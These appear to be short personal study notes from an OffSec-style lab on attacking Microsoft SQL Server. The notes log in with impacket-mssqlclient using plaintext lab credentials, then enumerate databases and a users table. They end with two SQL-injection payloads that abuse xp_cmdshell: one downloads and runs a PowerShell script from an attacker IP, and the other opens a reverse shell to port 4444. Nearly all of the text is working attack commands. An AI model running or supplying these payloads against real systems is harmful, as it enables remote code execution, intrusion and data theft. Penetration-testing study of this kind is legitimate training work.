natively integrates into windows ecosystem
builtin command line tool SQLCMD
from kali using impacket-mssqlclient
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;

```
'EXEC xp_cmdshell "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.241:9090/rev.ps1')"; --
'EXEC xp_cmdshell "powershell Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.241 -Port 4444"; --
```